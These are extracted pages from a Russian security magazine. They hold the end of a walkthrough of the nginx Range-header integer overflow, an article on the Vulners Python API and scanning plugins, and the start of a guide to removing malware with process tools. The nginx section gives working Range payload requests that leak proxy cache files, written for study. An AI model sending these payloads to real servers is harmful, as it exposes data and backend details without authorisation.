На этом эта пе выполнения позиция начала выборки (start) равна длине все‐
го ответа (content_length) минус передан ное зна чение конца выборки (end)
без знака минус. Так что если мы отправим значение заведо мо большее, чем
общая длина зап роса, то получим отрицательное значение для начала
выбор ки.





        Невер ное зна чение начальной позиции выборки данных

Ко неч ная позиция выборки становится равной длине отве та минус единица.
Дальше сле дует проверка общей длины воз вращаемых данных, и если она
боль ше, чем общий размер ответа, то заголо вок игнорируется. Все как ука‐
зано в спе цифи кации.


/src/http/modules/ngx_http_range_filter_module.c
396:     if (size > content_length) {
397:         return NGX_DECLINED;
398:     }

Об щий размер считает ся с помощью следующего алгоритма.


/src/http/modules/ngx_http_range_filter_module.c
295:     size = 0;
...
369:     found:
370:
371:         if (start < end) {
372:             range = ngx_array_push(&ctx‐>ranges);
...
377:             range‐>start = start;
378:             range‐>end = end;
379:
380:             size += end ‐ start;

Ес ли началь ная позиция выборки меньше конечной, то начинаем считать
size. Сначала он равен нулю, а затем перебираются все переданные диапа‐
зоны, если их несколько, и к текущему значению прибавляется разность
конечной и начальной позиции выборки (строка 380).
  Нам нуж но собрать такой пакет, чтобы итоговый раз мер был меньше
общей длины докумен та. Обрати внимание на тип переменных start, end
и size.


/src/http/modules/ngx_http_range_filter_module.c
273:     off_t                         start, end, size, conten
t_length, cutoff,
274:                                   cutlim;

По мануалу The GNU C Library, тип off_t — это целое со знаком, и его диапа‐
зон значений зависит от системы и нас троек компиляции. Если исходники
ском пилиро ваны  с  фла гом  _FILE_OFFSET_BITS  ==  64,  то  размер
равен 64 бит. C nginx как раз такая исто рия.
  Получа ется, что мак симальное положительное значение, которое может
быть у переменных, — это 0x7fffffffffffffff, так как пос ледний бит отве‐
чает за знак.





           Максимальное положительное значение типа oﬀ_t

Ис поль зуя это знание, мы можем обой ти проверку size > content_length.
Так как общий размер считает ся исходя из всех переданных в Range диапа‐
зонов, в пер вом диапазоне мы укажем отри цательное значение, с которого
следует начать читать дан ные. Во вто ром диапазоне мы передадим большое
отрицатель ное зна чение, которое при вычитании пре высит допустимые зна‐
чения типа off_t и ста нет положитель ным, но мень ше полного размера
документа. Спокой но, сейчас на при мере все станет понят но! :‐)
  До пустим, мы хотим начать читать с байта ‐7000. Общий раз мер докумен‐
та равен 942 байт. При прос том зап росе Range: bytes=‐7000 получается
следующая кар тина.





          Зап рос с одним отри цатель ным диапа зоном в Range


...
while (*p >= '0' && *p <= '9') {
    ...
    end = end * 10 + *p++ ‐ '0';
} # end = 7000
...
    start = content_length ‐ end; # start = 942 ‐ 7000 = ‐6058
    end = content_length ‐ 1; # end = 942 ‐ 1 = 941
...
if (end >= content_length) {
    end = content_length;
} else {
    end++;
} # end = 942
...
if (start < end) { # ‐6058 < 942 == True
    ...
    size += end ‐ start; # size = 0 + ( 942 ‐ (‐6058) ) = 7000
...
if (size > content_length) { # 7000 > 942 == True
    return NGX_DECLINED;
}
...

Пос леднее усло вие истинно — раз мер возвращаемых данных не может быть
боль ше обще го размера докумен та. Поэто му хидер игнориру ется и сервер
воз вращает все данные. Что бы этого избежать, нам нужно добавить второй
диапазон, и выбрать его следует таким, чтобы при выпол нении он превысил
допустимое значение переменной size.
   0x8000000000000000 —  это  наимень шее  отрицательное  значение,
которое воз можно ука зать, используя тип off_t. Чтобы оно получилось
при вычислении, нужно проделать обратную про цедуру и прибавить к нему
зна чение, с которо го мы хотим начать читать дан ные. В нашем слу чае:


0x8000000000000000 + (‐7000) = 9223372036854768808





      Вычисляем второй диапа зон для отправ ки в заголовке Range

Отправ ляем зап рос:


GET / HTTP/1.1
Host: nginx.visualhack
Range: bytes=‐7000,‐9223372036854768808

Первый диапазон мы уже рассмотрели, теперь посмотрим по шагам, что про‐
исхо дит при пар синге вто рого.


...
while (*p >= '0' && *p <= '9') {
    ...
    end = end * 10 + *p++ ‐ '0';
} # end = 9223372036854768808
...
    start = content_length ‐ end; # start = 942 ‐ 922337203685476
8808 = ‐9223372036854767866
    end = content_length ‐ 1; # end = 942 ‐ 1 = 941
...
if (end >= content_length) {
    end = content_length;
} else {
    end++;
} # end = 942
...
if (start < end) { # ‐9223372036854767866 < 942 == True
    ...
    size += end ‐ start; # size = 7000(значение от первого
диапазона) + ( 942 ‐ (‐9223372036854767866) ) = ‐922337203685477
5808 (0x8000000000000000)
...
if (size > content_length) { # ‐9223372036854775808 > 942 == False
    return NGX_DECLINED;
}
...





          Отправка зап роса, который вызывает переполнение

В ито ге второй рейндж превращается в тыкву, а мы получаем выбор ку,
которая начинается с ука зан ного нами первого диапазона минус раз мер
документа, то есть ‐6058‐941/942.


Proof of concept
Думаю, ты знаешь, что nginx можно использовать как кеширу ющий прок‐
си‐сер вер. Именно на эту роль он настроен в нашем подопытном докер‐кон‐
тей нере.


/etc/nginx/conf.d/default.conf
12:     location ^~ /proxy/ {
13:             proxy_pass http://127.0.0.1:8080/;
14:             proxy_set_header HOST $host;
15:             proxy_cache my_zone;
16:             add_header X‐Proxy‐Cache $upstream_cache_status;
17:             proxy_ignore_headers Set‐Cookie;
18:     }

Все запросы к /proxy/ ведут к локальному серверу Apache и кешируются.


/etc/nginx/nginx.conf
27:     proxy_cache_key "$scheme$request_method$host$request_uri";
28:     proxy_cache_path /tmp/nginx levels=1:2 keys_zone=my_zone:10m;
29:     proxy_cache_valid 200 10m;

Кеш‐фай лы складываются в дирек торию /tmp/nginx. Для формирования
путей и имен фай лов используют ся переменные, указанные в директиве
proxy_cache_key. Сделаем зап рос к кар тинке /proxy/demo.png и пос‐
мотрим на сге нерирован ный кеш‐файл.





                 Кеш‐файл, созданный после зап роса

Как видишь, в фай ле сохраняется специальный хидер плюс оригинальный
ответ от Apache. Вот эти данные мы и сможем получить, используя багу
с перепол нени ем. Чтобы это провер нуть, нужно взять значение заведо мо
боль ше размера возвращаемого сервером документа (он ука зан в хидере
Content‐Length), но меньше размера кеш‐файла. В нашем случае диапазон
зна чений дол жен быть больше 16 585, но мень ше 17 217.
   Те перь, используя полученные ранее зна ния, выс читываем второй диапа‐
зон: 0х8000000000000000  ‐  17217  =  9223372036854758591. Вставляем
полученные диапазоны в пакет и отправляем его.


GET /proxy/demo.png HTTP/1.1
Host: nginx.visualhack
Range: bytes=‐17217,‐9223372036854758591





            Читаем кеш через уязвимость в перепол нении

Вуаля! Мы получили полное содер жимое кеш‐файла, включая хидер и ори‐
гинальный запрос к серверу за прокси. Теперь мы можем узна вать, какое
при ложе ние находится за прокси и, если повезет, его IP.
  Разуме ется, сущес тву ет парочка экс плоитов для этой баги, которые всё
дела ют на автомате. Нап ример, версия авторства nixawk.
   Также рекомендую заглянуть в патч, который исправляет уязвимость,
и пос мотреть, как он сделан. Может быть, именно ты найдешь байпас!


ЭКСПЛУАТИРУЕМ УЯЗВИМОСТЬ (ВИДЕО)





ВЫВОДЫ
Ре зультат, как я и пре дуп реждал, невеликий. Но разобрать ся во внут ренней
кухне при ложе ния никогда лиш ним не быва ет. В реальных проектах почти
никогда не получается так, что найденная уязвимость в один запрос дает при‐
вилегии суперполь зователя на уда ленной машине. Чаще всего при ходится
по крупицам собирать данные о системах и с этой информацией пробираться
к инте рес ным целям. Воз можно, эта уязвимость будет одним из звеньев той
цепоч ки, что при ведет тебя к новому способу эксплу атации старых, уже
запатченных уязвимостей.
ВЗЛОМ





      Кирилл Ермаков                    Игорь Булатенко                     Иван Елкин





    ИЩЕМ ЭКСПЛОИТЫ ИЗ PYTHON,
     СКАНИМ УЯЗВИМЫЕ СЕРВЕРЫ
     И АВТОМАТИЗИРУЕМ ПЕНТЕСТ




Про ект Vulners за пару лет прев ратился из агрегатора дан‐
ных о багах в довольно популярный инс трумент пентестера.
Это уже полноцен ный тулкит для поиска эксплоитов, API
для Python, плагины для Burp Suite и Chrome, серверный
агент. Vulners удоб но встраивает ся в сценарии атак, на нем
пишут сканеры уяз вимос тей. В этой статье мы посмотрим,
что может предложить Vulners, а также научимся исполь‐
зовать всю мощь его Python API в повседневных задачах.




                      Если ты до  этого не  стал кивался  с  Vulners,
                       почитай эту статью. Она даст базовое понимание,
                      о чем вообще речь и зачем нужен Vulners.
                          Также посмотри этот материал о консольной
                          тул зе для поиска сплоитов getsploit. Мы же зай‐
                   мемся более низ коуровневым жонглирова нием
                         API из Python.



ИЩЕМ СПЛОИТЫ ИЗ PYTHON
Чем дальше раз вивался Vulners, тем больше мы получа ли писем с просьбами
дать описание нашего API.
  Конечно, начали мы с самого прос того — сделали Swagger. Но вскоре
заметили, что даже мы сами, исполь зуя свой API, изобрета ем велосипеды
по два раза в день. Каждый разработчик внут ри проекта создал свой врап‐
пер, чтобы обра щаться к Vulners из сво их ути лит. В конце концов нас самих
достал такой зоопарк, и мы решили унифицировать работу с API хотя бы
для Python. Вот так и появился пуб личный питоний API.


Без ТЗ результат ХЗ
Для начала мы соб рали статистику обращений к API и выяснили, что самые
часто запрашиваемые функции — это:
 • поиск;
 • запросы на выгрузку коллекций для локального исполь зования;
 • попыт ки использовать API от Vulners Burp Scanner Plugin;
 • переиспользование вызовов утилиты getsploit.

Ну что же, какие вызовы надо реали зовать в будущем враппере, стало понят‐
но. Но ведь поль зовате ли Python‐биб лиотек сов сем не хотят разбираться, что
в какой параметр отправляется (для этого API‐либа и нужна). Так что
основная задача — сделать API удоб ным и прос тым. Вре мя программи‐
ровать!


Как устро ена либа для питоньего поиска
Как и в любом враппере, начали мы с велосипеда — сделали прос тую обер‐
тку на базе requests для того, чтобы обращаться к JSON API.
   Тут все просто: создается opener, который потом обрабаты вает все зап‐
росы тво его приложе ния в рам ках одной сессии. И сюда же вынесе ны
основные URL, чтобы можно было потом добавлять новые пути для запросов.


class Vulners(object):
    def __init__(self, proxies=None):
        """
        Set default URLs and create session object
        :param proxies: {} dict for proxy supporting. Example: {
"https": "myproxy.com:3128"}
        """
        # Default URL's for the Vulners API
        self.__vulners_urls = {
            'search':       "https://vulners.com/api/v3/search/
lucene/",
            'software':     "https://vulners.com/api/v3/burp/
software/",
            'id':           "https://vulners.com/api/v3/search/id/",
            'suggest':      "https://vulners.com/api/v3/search/
suggest/",
            'ai':           "https://vulners.com/api/v3/ai/scoretext/
",
            'archive':      "https://vulners.com/api/v3/archive/
collection/"
        }
        # Default search parameters
        self.__search_size = 100
        # Requests opener
        self.__opener = requests.session()
        self.__opener.headers = {'User‐Agent': 'Vulners Python API %
s' % api_version}
        if proxies is not None:
            if not isinstance(proxies, dict):
                raise TypeError("Proxies must be a dict type")
            self.__opener.proxies.update(proxies)

Вторым «подкапотным» помощником стали обертки для ини циации GET‐
и POST‐зап росов. Они просто перекидывают переданный  dict по URL
из списка, определенного в init.
  После получе ния резуль тата функция adapt_response_content или воз вра‐
щает dict, сформирован ный из JSON‐ответа сервера, или отдает его в raw‐
виде в случае не JSON‐ответа.


def __vulners_get_request(self, vulners_url_key, json_parameters):
    """
    Tech wrapper for the unified
    :param vulners_url_key: Key for the self.vulners_urls dict
    :param json_parameters: {} dict for the API call
    :return: 'data' key from the response
    """
    # Return result
    response = self.__opener.get(self.__vulners_urls[vulners_url_key]
, params=json_parameters)
    return self.__adapt_response_content(response)
def __vulners_post_request(self, vulners_url_key, json_parameters):
    """
    Tech wrapper for the unified
    :param vulners_url_key: Key for the self.vulners_urls dict
    :param json_parameters: {} dict for the API call
    :return: 'data' key from the response
    """
    # Return result
    response = self.__opener.post(self.__vulners_urls[vulners_url_key
], json=json_parameters)
    return self.__adapt_response_content(response)

Ты спросишь: разве это лучше, чем самому дер гать питоний requests? Ведь
с такими вызовами все еще не разоб рать ся без знания API Vulners. И будешь
прав. Поэтому мы сде лали пуб личные вызовы‐обер тки, которые реализуют
функциональность Vulners без лишних приседа ний.
   Вот, нап ример, как выглядит поиск уяз вимостей по CPE‐строке. И поль‐
зователю абсо лютно не нуж но знать, что и куда потом раскладывается в зап‐
росе и в каком виде надо подавать параметры.


def cpeVulnerabilities(self, cpeString):
      """
      Find software vulnerabilities using CPE string. See CPE refere
nces at https://cpe.mitre.org/specification/
      :param cpe: CPE software string, see https://cpe.mitre.org/
specification/
      :return: {merged by family dict}
      """
      dataDocs = {}
      if len(cpeString.split(":")) <= 4:
          raise ValueError("Malformed CPE string. Please, refer to
the https://cpe.mitre.org/specification/. Awaiting like 'cpe:/a:
cybozu:garoon:4.2.1'")
      version = cpeString.split(":")[4]
      results = self.__burpSoftware(cpeString, version, type='cpe')
      for element in results.get('search'):
          elementData = element.get('_source')
          dataDocs[elementData.get('bulletinFamily')] = dataDocs.get(
elementData.get('bulletinFamily'), []) + [elementData]
      return dataDocs

Соответственно, орга низация кода внутри библиотеки получи лась достаточ‐
но проз рачной.
  Все методы, доступные без двойного подчеркивания, публичные и орга‐
низуют зап росы на внутренние реализации методов, которые формиру ют
необходимые зап росы к API и обеспечива ют проверку типизации и контента.


As easy as «pip install vulners»
Но ведь что там под капотом у нас, как это работа ет, обычно никому не инте‐
ресно! Библиотека должна дать результат — удоб ные и практичные вызовы,
которые решают поставленные задачи: ищут сплоиты и инфу об уязвимостях.
Для того что бы тебе не пришлось ставить ее руками с GitHub, мы помес тили
ее в репозиторий PyPI.
   Ставим:


pip install ‐U vulners

И импорти руем библиотеку в своем коде:


import vulners
vulners_api = vulners.Vulners()

Вот и все, что тебе понадобится для использования Vulners API. Теперь мож‐
но попробовать решить твои задачи, используя этот инс трумент.


Про буем искать
Что же он уме ет в ито ге? Давай пробежимся по функци ям и примерам кода
на Python.
 • vulners_api.search даст возможность поис кать в базе точно так же,
   как сделано в web‐вер сии.


   heartbleed_related = vulners_api.search("heartbleed", limit=10)

 • vulners_api.document позволя ет най ти конкретную CVE или advisory
   по ее идентификатору.


   CVE_2017_14174 = vulners_api.document("CVE‐2017‐14174")

 • vulners_api.searchExploit делает поиск толь ко по коллекциям экс пло‐
   итов (Exploit‐DB, Packet Storm, Seebug и дру гим).


   wordpress_exploits = vulners_api.searchExploit("wordpress 4.7.0")

 • vulners_api.softwareVulnerabilities по переданному названию ПО и
   его вер сии воз вращает спи сок уяз вимостей.


   results = vulners_api.softwareVulnerabilities("httpd", "1.5")
   exploit_list = results.get('exploit')
   vulnerabilities_list = [results.get(key) for key in results if key
    not in ['info', 'blog', 'bugbounty']]

 • vulners_api.cpeVulnerabilities — очень полезная штука для интегра‐
   ции, нап ример, с Nessus — по CPE‐строке твоего ПО возвращает список
   CVE, которые зат рагивают этот продукт.


   cpe_results = vulners_api.cpeVulnerabilities("cpe:/a:cybozu:
   garoon:4.2.1")
   cpe_exploit_list = cpe_results.get('exploit')
   cpe_vulnerabilities_list = [cpe_results.get(key) for key in cpe_re
   sults if key not in ['info', 'blog', 'bugbounty']]

 • vulners_api.references возвращает свя зи и зависимос ти документов
   в базе данных. Зачем? Когда нуж но, нап ример, по CVE найти патч для кон‐
   кретной ОС.


   references = vulners_api.references("CVE‐2014‐0160")

 • vulners_api.aiScore позволя ет сде лать оцен ку описания уяз вимости,
   исполь зуя нашу нейросеть Vulners AI.


   text_ai_score = vulners_api.aiScore("My cool vulnerability descri
   ption")

 • vulners_api.archive — самый главный метод для любите лей локальной
   обработ ки  дан ных. Он  выг ружает  весь  кон тент  нужной  коллекции
   для локального исполь зования.


   all_cve = vulners_api.archive("cve")

Такая  обвязка  функциональности  «Вульнер са»  позволяет  соз давать
как самодельные сканеры уязвимостей, так и любые другие проекты, где тебе
нуж но работать с данными об уязвимостях или иным security related кон‐
тентом.





            Типовой ответ сервера на зап рос об уяз вимостях

Следующий ход — твой! Создавай классный софт, используй API для решения
сво их пов седнев ных задач автоматизации. Надеюсь, наша библиотека будет
тебе полезна.




Не дав но мы рас сказывали о мини‐сканере для Linux, который поз воля ет бук‐
вально за пару секунд проверить свой хост на наличие уязвимос тей.
   Ска нер представ ляет собой скрипт на Python, который после запуска счи‐
тывает установленные пакеты, отправляет это на сайт Vulners и в ответ
получает список уязвимостей. Скрипт отлично подходит для разовых опе‐
раций, но, если необходимо постоянно следить за сос тоянием патчей на сер‐
верах, осо бенно когда счет идет на сотни, требуется решение дру гого уров‐
ня.
   Чаще   все го  администраторы  выбирают  инс трумент  наподобие
Nessus/OpenVAS. Но с этим возника ет ряд проб лем: нужно создавать учетную
запись для сканиро вания, открывать сетевые дос тупы и прочее. При этом
зачастую внедрение таких сис тем защиты может сыграть отрицательную
роль — сер вер для сканирования будут исполь зовать для проведе ния самой
ата ки, за счет учетной записи и сетевых доступов. Поэтому использование
локального аген та — чаще всего более оправданный выбор. Имен но так воз‐
ник сканер (агент) Vulners.
   Ставим сканер на сервере:
 1. Подключи репозиторий — примеры для Debian или Red Hat есть на GitHub.
 2. Установи пакет vulners‐agent с помощью пакетного менеджера своего
   дистриба.
 3. Пропиши ключ регистрации в кон фиге. Его можно бесплатно получить
   на сайте, в разделе userinfo.

Скрипт агента про писывает ся в crontab и запускается раз в два часа. Время
работы скрипта составляет всего пару секунд, поэтому при необходимости
можно запус кать его и чаще.



Кор невое отличие от похожих ска неров — для запус ка не требуется привиле‐
гий root, скрипт запускается от учетной записи nobody. Сам скрипт занимает
буквально 500 строчек кода, поэто му можно довольно быс тро его вычитать
и убе диться, что нет каких‐то закладок.
  При первом запуске зарегистри руется агент, также пропишутся допол‐
нительные параметры в нас тройках — такие как IP‐адрес машины и ее имя.
Ведь результат анализа нужно как‐то смот реть и отличать один сервер
от другого. Делать это только на основе внешнего IP‐адреса в большинстве
слу чаев невозможно.
  Но если ты не хочешь, чтобы настоящий IP‐адрес и имя сервера отда‐
вались наружу, есть возможность установить фейковые парамет ры вручную
в конфигурационном файле. Для этого в /opt/vulners/conf/vulners.conf
нуж но задать значения параметров ipaddr и fqdn. Пос ле всех этих действий
результат сканиро вания можно будет посмотреть в веб‐интерфейсе, с раз‐
личной груп пировкой и фильтра ми.





            Отчет аген та об уязвимостях на твоем сервере

Агент поз воля ет решить проблему патч‐менеджмента за считаные минуты,
при этом он бесплатный.



ПЛАГИН ДЛЯ BURP SUITE
Burp Suite дав но зарекомендовал себя среди безопас ников и иссле дова‐
телей как универ сальный швейцарский нож, сочетающий возможности прок‐
си, сканера периметра, фаззера и прос то HTTP‐кли ента.
  При пентесте часто приходит ся авто матизиро вать поиск ошибок, воспро‐
изводя спе цифичные для конкретного web‐приложения векторы (CSRF‐
токены, auth‐токены), а иногда хочется искать и свежеопубликованные уяз‐
вимос ти систем, плагины и эксплоиты для которых появ ляют ся не сразу, даже
в боль ших сканерах типа Nessus.


Зачем нужен плагин
Один из вариантов понять, что система потен циально уязвима, — пос мотреть
версию соф та, на котором крутится эта сис тема: веб‐сервер, язык, фрей‐
мворк. В веб‐приложе ниях подоб ные фин герпринты лежат прямо в заголов‐
ках или теле отве та сервера.





                 За головки и тело ответа сер вера

Все пре дельно прос то — X‐Софт: v.Версия. Что бы авто мати зировать сбор
таких данных, в BApp Store уже есть плагин Software Version Reporter. Он
в пассивном режиме смот рит ответы от сервера и парсит отпе чат ки при ложе‐
ний по заранее полученным регуляр кам.
   Даль ше, зная версию софта, можно попробовать поискать извес тные уяз‐
вимос ти и экспло иты под нее.





              Ищем информацию об уяз вимостях


Автоматизируй это!
По иск по фингер принтам может быть эффективным подходом для обнаруже‐
ния багов, но копировать версии ПО и забивать их в «Вульнерс» каждый раз
может оказать ся утомительно.
  Мы написали API и пла гин для Burp Suite Software Vulnerability Scanner,
который сам дампит фингерприн ты ата куемо го сай та и прогоня ет их по базе
Vulners. API принимает на вход два вари анта полезной нагрузки:
   Software + Version


{"software":"httpd","version":"2.4.23","type":"software"}

CPE (Common Platform Enumeration)


{"software":"cpe:/a:php:php","version":"5.6.27","type":"cpe"}

Зап росы совер шаются на URL https://vulners.com/api/v3/burp/soft‐
ware/?utm_source=xakep&utm_medium=xtools&utm_campaign=scan. Конеч‐
ный запрос может выг лядеть так:


POST /api/v3/burp/software/?utm_source=xakep&utm_medium=xtools&utm_ca
mpaign=scan HTTP/1.1
Host: vulners.com
content‐type: application/json
Content‐Length: 66
{"software": "cpe:/a:php:php", "version": "5.6.31", "type": "cpe"}

В ответ получаем список уязвимос тей и эксплоитов в стан дартном формате
Vulners.





                 Список полученных уяз вимостей


Как задетек тить все
Для лучшего фингерпринтинга мы вынес ли правила детекта в отдельный
репози торий, который постоянно наполняется новыми правилами.
  Каждое правило содержит в себе:
 • type — тип детекта, фор мализо ванный под наиболее эффективный поиск
   в базе cpe либо software;
 • alias — уникальное имя для детектируемого ПО;
 • regexp — само регулярное выражение, по которо му будем находить ПО.

Кста ти, правила детекта открыты для контрибьюторов на Гит хабе, присоеди‐
няй ся!
  Плагин может стать полезным инс трумен том для первоначального иссле‐
дования при ложения. Он поз воляет избавиться от рутины, автоматизировав
выяв ление уязвимых компонентов системы.
  А иногда может прос то приятно удивить, если ты всего лишь бороздишь
прос торы интерне та с вклю ченным Burp‐proxy. ;)





              Реаль ный пример использования плагина




                   Наш  плагин   Software   Vulnerability  Scanner
                       для Burp Suite.





Ес ли у тебя нет лицен зии на Burp, но ты хотел бы поп робовать, как работает
сканер, — мы написали расширение для Chrome. Плагин использует абсо‐
лютно те же методы API и пра вила детекта, что и версия для Burp.





             Плагин для «Хрома» сигналит об уязвимом ПО





OUTRO
Vulners — уже не прос то парсер с поиском. Каждый день он обрастает
новыми фичами и сво ей эко системой. Наши утилиты — это всего лишь при‐
мер того, как можно использовать потен циал базы уязвимостей. Но может
быть, ты при думаешь что‐то более кру тое? Так что welcome, пробуй. И не
забывай писать о глю ках и улучшениях!
MALWARE





   Иван Пискунов





                                              КАК НЕ ЗАРАЗИТЬСЯ •
                               ЧТО ДЕЛАТЬ, ЕСЛИ ВИРУС ПРОНИК •
                       КАК ВОССТАНОВИТЬ СИСТЕМУ ПОСЛЕ ПОБЕДЫ •





На воп рос «Какой антивирус вы используете на своей вин‐
довой машине?» мно гие безопасники (в том числе и сот‐
рудники нашей редак ции) отве чают прос то: никакой. Когда
эпидемии в сотни тысяч зараженных компьюте ров разгора‐
ются, нев зирая на все самые передо вые технологии сис тем
защиты, а антивирусы в наших тестах показывают сом‐
нитель ные резуль таты, об отказе от анти вируса вполне стоит
подумать.


План статьи будет таков: как локализовать заразу, если она все‐таки проник‐
ла на твою машину, как победить руткиты и как восстановить систему после
зараже ния, если все зашло слишком далеко. В конце статьи мы дадим нес‐
колько банальных, но по‐прежнему актуальных советов о том, как избежать
зараже ния (с другой сто роны, как можно называть банальными советы, соб‐
людение которых снизило бы количество заражен ных машин Сети в десятки
раз?).




                Мы  вовсе  не  настаиваем  на  сно се  твоего
                    любимо го Internet security, но прочитать статью
                            «На малварь без антивируса» и советы из это го
                      материала очень рекомендуем.



ЧТО ДЕЛАТЬ В СЛУЧАЕ ЗАРАЖЕНИЯ?

Итак, если у тебя есть подозрение на то, что машина инфи цирована, в первую
оче редь ты дол жен выпол нить нес колько дей ствий:
 • от клю чить хост от сети (вытащить UTP‐кабель, погасить Wi‐Fi);
 • вынуть из портов все внешние девайсы (HDD‐ и USB‐устройства, телефо‐
  ны и прочее).

Все эти действия свя заны с необходимостью изолировать нашего паци ента
от внешнего мира. Отклю чать хост нуж но обязательно и от доступа во внеш‐
ний мир через интернет и локалку, пос кольку мал варь практически со стоп‐
роцентной веро ятностью будет пытаться себя распростра нить на весь дос‐
тупный ей сегмент. К тому же если зловред является частью ботнет‐сети
или содер жит ком поненты RAT, то он может без действовать до того момента,
как поступит управляющая команда с C&C‐сер вера из внешней сети. Также
это страхует нас и от утеч ки локальных дан ных во внеш ний мир, к при меру
через DNS‐туннелиро ванные или подоб ные хакерские фичи. Сле дуя этой же
логике, рекомендуют как можно скорее вытащить все подключенные к паци‐
енту девайсы: к при меру, если это вирус‐шифроваль щик, то он может просто
не успеть добраться до данных на внеш них HDD и USB‐флешках.




                      Хардкор ным читате лям советуем про честь наш
                       цикл статей про реверсинг малвари. Малварь
                        в руках хакера, вооруженного статьями из этого
                       цик ла, пожалеет о том, что появи лась из‐под
                      пера вир мей кера. :)


Ты можешь еще услышать совет сразу выключить зараженный компь ютер.
Здесь неоднознач но. С одной стороны, это может приостановить раз‐
рушительные дей ствия зловреда. Но есть и риск того, что пос ле выключения
в сле дующий раз ОС боль ше вообще не заг рузится, а данные на винтах пот‐
рутся. Поэто му дей ствовать нужно по обсто ятель ствам, многое зависит
от того, какая именно малварь была запущена и какие цели она преследует.
Ниже при рассмот рении кейсов мы расскажем и о первой, и о второй ситу‐
ации.
   Ну и конечно, для успешной борьбы с мал варью и восстанов ления сис‐
темы у тебя должны быть привилегии административ ной учетной записи, так
как мно гие дей ствия (манипуляции с системными файлами, остановка
и перезапуск сетевых служб, вос становление реес тра, изменение конфигура‐
ции загрузчика и тому подобное) потребуют от нас всей пол ноты прав на сис‐
тему. :)




                    Неверные и неосмыслен ные действия могут при‐
                       вести  к нарушению  нормаль ной  работы ОС,
                  ПО или к потере дан ных. Ни автор, ни редакция
                      не несут ответственности за ущерб, причиненный
                      неправильным использованием матери алов дан‐
                      ной статьи. Выполняй только те действия, суть
                      и значение которых ты осознаешь.



ПОИСК ПРОЦЕССОВ И ОБЕЗВРЕЖИВАНИЕ МАЛВАРИ В ПАМЯТИ

Любая малварь, что бы выполнять свои действия, должна быть запущена
в опе ративной памяти. И неважно, как именно бинарный код был загружен
в RAM — из exe‐файла, вложенного в письмо, скрипта из инфи цированной
HTML‐странич ки или был соб ран только из сетевых пакетов, как нашумев ший
в начале 2000‐х годов бестелесный червь Slammer, поразивший тысячи сер‐
веров за несколько десятков минут. Поэто му клю чевой задачей на первом
эта пе становится поиск и иден тифика ция процесса зловреда в памяти.
И стандар тный менеджер задач Windows тут нам не помощ ник. Почему?
Да потому, что даже начинающий кодер на Delphi может использовать фун‐
кции, поз воля ющие скры вать из области видимос ти штатного Task Manager’а
запущенный про цесс. Я еще молчу о том, что зловред может содер жать рут‐
кит, который будет скры вать его дей ствия в сис теме.
   Итак, к нам на помощь при дут утилиты — самос тоятельные и ком плексные
менеджеры задач. Первая тулза, которую мы рассмотрим, — это Process
Monitor, бесплатная утилитка из набора SysInternals Suite. По сути, она объ‐
еди няет в себе сразу две дру гие утилиты — FileMon (мониторинг файловой
системы) и RegMon (монито ринг реестра). Тулза предос тавля ет мощ ный инс‐
трумент для мониторинга фай ловой системы, системного реестра, а так же
всех процессов в опе ративной памяти в реальном вре мени.
  На панели есть несколько интересных кнопок, поз воля ющих выпол нять
фильтрацию процессов и дей ствий сис темы по нуж ным нам кри териям:
 • show registry activity — просмотр активности реестра (чтение, запись клю‐
   чей);
 • show ﬁle system activity — просмотр действия с фай лами (чтение, запись);
 • show network process activity — ана логично по процес сам, использующим
   сеть;
 • show process and thread — прос мотр процес сов и нитей.





                Рабочее окно ути литы Process Monitor

Вторая, более наворо ченная тулза — это Process Explorer. Предназначена
для монито ринга про цессов в системе. Позволяет не только отсле дить про‐
цесс, но и уточнить, какие файлы и папки им используются. Фишка прог‐
раммы в том, что тут же в рабочем окне можно выделить процесс и по щел чку
мыши проверить его на VirusTotal.





                Рабочее окно ути литы Process Explorer

System Explorer, одна из излюбленных антивирусными исследова телями
тулз, обеспечивает монито ринг всех процес сов в сис теме, отображает
детальную заг рузку памяти и фай ла подкачки, работу процессора, драй веров,
откры тых соеди нений в сети и многое дру гое.





            Просмотр списка процессов в System Explorer

В ути литу встроена база данных — можно про верить наличие вредонос ного
кода в конкретном фай ле и отправить на сер вер отчет VirusTotal.





         Проверка про цес са на безопасность в System Explorer

Тулза позволяет зак рыть любой процесс и группу свя занных процес сов,
которые тормозят работу системы или программы, просмотреть историю
дей ствий для любой программы. Под держи вает ся работа с пла гинами.
Интерфейс разделен на вклад ки, каж дая из которых посвящена конкретным
задачам. System Explorer позволяет управлять объ ектами автозапуска, прос‐
матри вать и опе ративно деинсталлировать  уста новленные при ложе ния,
управлять служ бами Windows и многое другое.





           Ре жим Explorer с более наг лядной формой вкладок

Тулза четвертая — это AnVir Task Manager, пол ноценный менеджер задач,
который поз воляет контролировать все, что запуще но на компьюте ре, а также
пре дос тавляет удобные инструменты для настройки компьюте ра. Тул за поз‐
воля ет  управлять  автозаг рузкой, запущенными про цессами, сервисами
и драйверами и заменяет диспетчер.





               Спи сок процессов в AnVir Task Manager





    Спи сок инсталлированных в систему драй веров в AnVir Task Manager

В самом прос том случае имя процес са совпадает с именем исходного exe‐
файла, который был запущен. Поэтому и самый простой спо соб найти мал‐
варь — это прос мотреть весь спи сок запущенных процессов и обра тить вни‐
мание на те, которые вызывают подозрения. Но есть и более сложные ситу‐
ации, когда вир мейкеры используют системные имена, к примеру системных
служб Svchost.exe, или, хуже того, не соз дают новый про цесс, а ин жектируют
код зловреда в легитимный! Если такой про цесс завершит часть функций, ОС
может стать недос тупна или вовсе воз никнет RPC‐ошибка, при водящая
к перезагрузке. Такую фичу использовал небезызвес тный червь  Blaster.
На глаз тут вредоносный процесс, конечно же, не определишь, нужны инс тру‐
менты посерьезнее.
  На выручку нам придет утилита AVZ, раз работанная Олегом Зайцевым.
Это не анти вирус, но прог рамма содержит в себе набор сигнатур наибо лее
известных чер вей, бэк доров и руткитов.





                  Основное окно ути литы AVZ

По этому тулза может ска нировать опе ративную память и детек тировать ском‐
про метирован ные процес сы. Помимо этого, она име ет ряд крутых фич: собс‐
твен ный драйвер для обна руже ния руткитов (kernel‐mode), кей логгеров и тро‐
янских DLL, прямой дос туп к диску для работы с заблокиро ванными файлами
на томах NTFS, в том числе помещения их в каран тин, анализатор откры тых
пор тов TCP/UDP с целью обнаружения RAT, анализатор Winsock SPI/LSP кор‐
ректности сетевых настроек, анализатор мусорных настроек Internet Explorer,
а также модуль про верки целос тности системного реестра, BHO, рас‐
ширений IE и про водника (Explorer) и ана лизатор всех доступных видов авто‐
запуска.





              Опции восста новления системы в AVZ





                Прос мотр сетевых соеди нений в AVZ



